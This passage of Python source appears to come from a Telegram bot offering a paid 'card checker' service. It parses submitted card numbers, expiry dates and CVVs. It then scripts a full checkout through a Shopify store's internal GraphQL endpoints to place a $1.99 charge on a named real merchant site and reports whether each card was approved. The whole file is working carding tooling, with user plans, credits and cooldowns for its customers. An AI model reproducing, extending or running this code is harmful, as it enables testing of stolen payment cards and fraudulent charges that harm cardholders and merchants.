                                    "postalCode": self.address["zip"],
                                    "firstName": self.first_name,
                                    "lastName": self.last_name,
                                    "zoneCode": self.address["state_code"],
                                    "phone": self.phone_e164
                                }
                            },
                            "cardSource": None
                        },
                        "giftCardPaymentMethod": None,
                        "redeemablePaymentMethod": None,
                        "walletPaymentMethod": None,
                        "walletsPlatformPaymentMethod": None,
                        "localPaymentMethod": None,
                        "paymentOnDeliveryMethod": None,
                        "paymentOnDeliveryMethod2": None,
                        "manualPaymentMethod": None,
                        "customPaymentMethod": None,
                        "offsitePaymentMethod": None,
                        "customOnsitePaymentMethod": None,
                        "deferredPaymentMethod": None,
                        "customerCreditCardPaymentMethod": None,
                        "paypalBillingAgreementPaymentMethod": None,
                        "remotePaymentInstrument": None
                    },
                    "amount": {
                        "value": {
                            "amount": payment_amount,  # FIXED: Use exact amount from proposal
                            "currencyCode": "USD"
                        }
                    }
                }
            ]

            # ========== CRITICAL FIX: Build delivery lines using COMPLETE data from Proposal response ==========
            # Also removed accuracy field from coordinates
            submit_delivery_lines = []

            if self.proposal_delivery_data and self.proposal_delivery_data.get('deliveryLines'):
                # Use complete delivery lines from Proposal response
                for line in self.proposal_delivery_data['deliveryLines']:
                    # Get the selected delivery strategy from proposal
                    selected_strategy = line.get('selectedDeliveryStrategy', {})
                    
                    # Build complete delivery line structure with ALL fields from proposal
                    delivery_line = {
                        "destination": {
                            "streetAddress": {
                                "address1": self.address["address1"],
                                "address2": self.address["address2"],
                                "city": self.address["city"],
                                "countryCode": self.address["country_code"],
                                "postalCode": self.address["zip"],
                                "firstName": self.first_name,
                                "lastName": self.last_name,
                                "zoneCode": self.address["state_code"],
                                "phone": self.phone_e164,
                                "oneTimeUse": False,
                                "coordinates": {
                                    "latitude": 40.1807369,
                                    "longitude": -75.1448143
                                    # REMOVED: accuracy field - not allowed in input
                                }
                            }
                        },
                        "selectedDeliveryStrategy": selected_strategy if selected_strategy else {
                            "deliveryStrategyByHandle": {
                                "handle": delivery_handle,
                                "customDeliveryRate": False
                            },
                            "options": {
                                "phone": self.phone_e164
                            }
                        },
                        "targetMerchandiseLines": {
                            "lines": [
                                {
                                    "stableId": stable_id
                                }
                            ]
                        },
                        "deliveryMethodTypes": line.get('deliveryMethodTypes', ["SHIPPING", "LOCAL"]),
                        "expectedTotalPrice": {
                            "value": {
                                "amount": self.shipping_amount,  # FIXED: Use exact shipping amount
                                "currencyCode": "USD"
                            }
                        },
                        "destinationChanged": False
                    }
                    submit_delivery_lines.append(delivery_line)
            else:
                # Fallback to building minimal structure if Proposal data not available
                submit_delivery_lines = [
                    {
                        "destination": {
                            "streetAddress": {
                                "address1": self.address["address1"],
                                "address2": self.address["address2"],
                                "city": self.address["city"],
                                "countryCode": self.address["country_code"],
                                "postalCode": self.address["zip"],
                                "firstName": self.first_name,
                                "lastName": self.last_name,
                                "zoneCode": self.address["state_code"],
                                "phone": self.phone_e164,
                                "oneTimeUse": False,
                                "coordinates": {
                                    "latitude": 40.1807369,
                                    "longitude": -75.1448143
                                    # REMOVED: accuracy field - not allowed in input
                                }
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle": delivery_handle,
                                "customDeliveryRate": False
                            },
                            "options": {
                                "phone": self.phone_e164
                            }
                        },
                        "targetMerchandiseLines": {
                            "lines": [
                                {
                                    "stableId": stable_id
                                }
                            ]
                        },
                        "deliveryMethodTypes": ["SHIPPING", "LOCAL"],
                        "expectedTotalPrice": {
                            "value": {
                                "amount": self.shipping_amount,
                                "currencyCode": "USD"
                            }
                        },
                        "destinationChanged": False
                    }
                ]

            # ========== CRITICAL FIX: Build complete SubmitForCompletion with ALL required fields ==========
            # Use exact amounts from proposal response to avoid PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT error
            
            submit_variables = {
                "input": {
                    "sessionInput": {
                        "sessionToken": self.session_token
                    },
                    "queueToken": self.queue_token if self.queue_token else "",
                    "discounts": {
                        "lines": [],
                        "acceptUnexpectedDiscounts": True
                    },
                    "delivery": {
                        "deliveryLines": submit_delivery_lines,
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True
                    },
                    "deliveryExpectations": {
                        "deliveryExpectationLines": delivery_expectation_lines
                    },
                    "merchandise": {
                        "merchandiseLines": [
                            {
                                "stableId": stable_id,
                                "merchandise": {
                                    "productVariantReference": {
                                        "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                        "properties": [],
                                        "sellingPlanId": None,
                                        "sellingPlanDigest": None
                                    }
                                },
                                "quantity": {
                                    "items": {
                                        "value": 1
                                    }
                                },
                                "expectedTotalPrice": {
                                    "value": {
                                        "amount": "1.99",
                                        "currencyCode": "USD"
                                    }
                                },
                                "lineComponentsSource": None,
                                "lineComponents": []
                            }
                        ]
                    },
                    "memberships": {
                        "memberships": []
                    },
                    "payment": {
                        # FIXED: Use exact total amount instead of "any": True
                        "totalAmount": {
                            "value": {
                                "amount": payment_amount,
                                "currencyCode": "USD"
                            }
                        },
                        "paymentLines": payment_lines,
                        "billingAddress": {
                            "streetAddress": {
                                "address1": self.address["address1"],
                                "address2": self.address["address2"],
                                "city": self.address["city"],
                                "countryCode": self.address["country_code"],
                                "postalCode": self.address["zip"],
                                "firstName": self.first_name,
                                "lastName": self.last_name,
                                "zoneCode": self.address["state_code"],
                                "phone": self.phone_e164
                            }
                        }
                    },
                    "buyerIdentity": {
                        "customer": {
                            "presentmentCurrency": "USD",
                            "countryCode": "US"
                        },
                        "phone": self.phone_e164,
                        "phoneCountryCode": "US",
                        "marketingConsent": [],
                        "shopPayOptInPhone": {
                            "number": self.phone_plain,
                            "countryCode": "US"
                        },
                        "rememberMe": False
                    },
                    "tip": {
                        "tipLines": []
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {
                            "value": {
                                "amount": "0",
                                "currencyCode": "USD"
                            }
                        },
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": []
                    },
                    "note": {
                        "message": None,
                        "customAttributes": []
                    },
                    "localizationExtension": {
                        "fields": []
                    },
                    "shopPayArtifact": {
                        "optIn": {
                            "vaultEmail": "",
                            "vaultPhone": self.phone_e164,
                            "optInSource": "REMEMBER_ME"
                        }
                    },
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None,
                        "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": []
                    },
                    "optionalDuties": {
                        "buyerRefusesDuties": False
                    },
                    "cartMetafields": []
                },
                "attemptToken": f"{checkout_token}-{self.generate_attempt_token()}",
                "metafields": [],
                "analytics": {
                    "requestUrl": self.checkout_url,
                    "pageId": "9ace7222-8C7B-46C3-BD9B-5EBD365E8C25"
                }
            }

            submit_payload = {
                "variables": submit_variables,
                "operationName": "SubmitForCompletion",
                "id": "ec1b10a3f438f9df5cb46727c6e5914bdf46ae08d6adb1500c5b413db3916d20"
            }

            response = self.session.post(
                f'{self.base_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion',
                headers=proposal_headers,
                json=submit_payload
            )

            if response.status_code != 200:
                return False, f"SUBMIT_FAILED - Status: {response.status_code}"

            try:
                submit_response = response.json()
            except:
                return False, "SUBMIT_PARSE_ERROR"

            # Parse submission response
            try:
                submit_data = submit_response.get('data', {}).get('submitForCompletion', {})

                # Check for receipt (contains actual result)
                if 'receipt' in submit_data and submit_data['receipt']:
                    receipt = submit_data['receipt']
                    receipt_id = receipt.get('id', '')
                    receipt_typename = receipt.get('__typename', '')

                    self.receipt_id = receipt_id
                    self.logger.data_extracted("Receipt ID", receipt_id, "SubmitForCompletion")
                    self.logger.data_extracted("Receipt Type", receipt_typename, "SubmitForCompletion")

                    # If it's a ProcessingReceipt, we need to poll for the actual result
                    if receipt_typename == 'ProcessingReceipt':
                        poll_delay = receipt.get('pollDelay', 500) / 1000  # Convert to seconds
                        self.logger.data_extracted("Poll Delay", f"{poll_delay}s", "ProcessingReceipt")

                        # Wait for the poll delay
                        await asyncio.sleep(poll_delay)

                        # Poll for actual receipt status
                        poll_success, poll_result = await self.poll_for_receipt(receipt_id, self.session_token)
                        return poll_success, poll_result

                    # If it's already a FailedReceipt, return the error
                    elif receipt_typename == 'FailedReceipt':
                        processing_error = receipt.get('processingError', {})
                        error_code = processing_error.get('code', 'UNKNOWN')
                        error_msg = processing_error.get('messageUntranslated', 'Payment failed')

                        return False, f"DECLINED - {error_code}: {error_msg}"

                    # Check for purchaseOrder in receipt (success indicator)
                    elif 'purchaseOrder' in receipt and receipt['purchaseOrder']:
                        purchase_order = receipt['purchaseOrder']

                        # Check payment lines for success indicators
                        payment_lines_check = purchase_order.get('payment', {}).get('paymentLines', [])
                        if payment_lines_check:
                            for line in payment_lines_check:
                                payment_method = line.get('paymentMethod', {})
                                if payment_method.get('__typename') == 'DirectPaymentMethod':
                                    credit_card = payment_method.get('creditCard', {})
                                    brand = credit_card.get('brand', 'Unknown')
                                    last_digits = credit_card.get('lastDigits', '****')
                                    return True, f"ORDER_PLACED - {brand} ****{last_digits}"

                        return True, f"ORDER_PLACED - Receipt: {receipt_id}"

                # Check for direct errors in submit response
                if 'errors' in submit_data and submit_data['errors']:
                    error_msgs = []
                    for error in submit_data['errors']:
                        code = error.get('code', 'UNKNOWN')
                        msg = error.get('localizedMessage', error.get('nonLocalizedMessage', 'Unknown error'))
                        error_msgs.append(f"{code}: {msg}")
                    return False, f"DECLINED - {' | '.join(error_msgs)}"

                # Check typename at submit level
                typename = submit_data.get('__typename', '')
                if typename == 'SubmitRejected':
                    reason = submit_data.get('reason', 'Unknown reason')
                    return False, f"DECLINED - Submission rejected: {reason}"
                elif typename == 'SubmitSuccess':
                    # Even if SubmitSuccess, check if we have a receipt to poll
                    if receipt_id:
                        await asyncio.sleep(0.5)
                        poll_success, poll_result = await self.poll_for_receipt(receipt_id, self.session_token)
                        return poll_success, poll_result
                    return True, "ORDER_PLACED - SubmitSuccess"

                # Check for specific error reasons
                if 'reason' in submit_data:
                    reason = submit_data.get('reason', 'Unknown reason')
                    return False, f"DECLINED - {reason}"

                # Default response - unknown state
                return False, f"UNKNOWN_RESPONSE - Type: {typename}"

            except Exception as e:
                return False, f"RESPONSE_PARSE_ERROR - {str(e)[:100]}"

        except Exception as e:
            self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
            return False, f"CHECKOUT_ERROR: {str(e)[:100]}"

    def generate_attempt_token(self):
        """Generate random attempt token suffix"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(12))


# ========== MAIN CHECKER CLASS ==========
class ShopifyChargeChecker:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.logger = ShopifyLogger(user_id)

    async def check_card(self, card_details, username, user_data):
        """Main card checking method using API"""
        start_time = time.time()

        self.logger = ShopifyLogger(self.user_id)
        self.logger.start_check(card_details)

        try:
            # Parse card details
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                elapsed_time = time.time() - start_time
                return format_shopify_response("", "", "", "", "Invalid card format. Use: CC|MM|YY|CVV", elapsed_time, username, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            # Validate
            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data)

            self.logger.card_details_log(cc, mes, ano, cvv)

            # Use API checkout
            checker = ShopifyChargeAPI(self.user_id)
            success, result = await checker.execute_checkout(cc, mes, ano, cvv)

            elapsed_time = time.time() - start_time

            if success:
                self.logger.complete_result(True, "APPROVED", result, elapsed_time)
            else:
                self.logger.complete_result(False, "DECLINED", result, elapsed_time)

            return format_shopify_response(cc, mes, ano, cvv, result, elapsed_time, username, user_data)

        except Exception as e:
            elapsed_time = time.time() - start_time
            self.logger.error_log("UNKNOWN", str(e))
            self.logger.complete_result(False, "UNKNOWN_ERROR", str(e), elapsed_time)
            try:
                cc = cc_parts[0]
                mes = cc_parts[1]
                ano = cc_parts[2]
                cvv = cc_parts[3]
            except:
                cc = mes = ano = cvv = ""
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {str(e)[:80]}", elapsed_time, username, user_data)


# ========== COMMAND HANDLER ==========
@Client.on_message(filters.command(["so", ".so", "$so"]))
@auth_and_free_restricted
async def handle_shopify_charge_199(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown
        can_use, wait_time = check_cooldown(user_id, "so")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ━[SHOPIFY $1.99 CHARGE]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/so</code> or <code>.so</code> or <code>$so</code>
🠪 <b>Usage</b>: <code>/so cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/so 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges $1.99 via faithandjoycraftsupply.com</code>
<b>~ Note:</b> <code>Deducts 2 credits AFTER check completes</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Invalid card format.
🠪 <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Show processing message
        processing_msg = await message.reply(
            f"""
<b>[Shopify $1.99 Charge] | #WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify $1.99 Charge</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Starting API checkout...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
<b>[+] Site:</b> faithandjoycraftsupply.com
━━━━━━━━━━━━━━━
<b>Processing $1.99 charge... Please wait.</b>
"""
        )

        # Create checker instance
        checker = ShopifyChargeChecker(user_id)

        # Process command
        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
            try:
                result = await charge_processor.execute_charge_command(
                    user_id,
                    checker.check_card,
                    card_details,
                    username,
                    user_data,
                    credits_needed=2,
                    command_name="so",
                    gateway_name="Shopify $1.99 Charge"
                )

                if isinstance(result, tuple) and len(result) == 3:
                    success, result_text, credits_deducted = result
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                elif isinstance(result, str):
                    await processing_msg.edit_text(result, disable_web_page_preview=True)
                else:
                    result_text = await checker.check_card(card_details, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)

            except Exception as e:
                print(f"❌ Charge processor error: {str(e)}")
                try:
                    result_text = await checker.check_card(card_details, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                except Exception as inner_e:
                    await processing_msg.edit_text(
                        f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(inner_e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                    )
        else:
            try:
                result_text = await checker.check_card(card_details, username, user_data)
                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
            except Exception as e:
                await processing_msg.edit_text(
                    f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                )

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
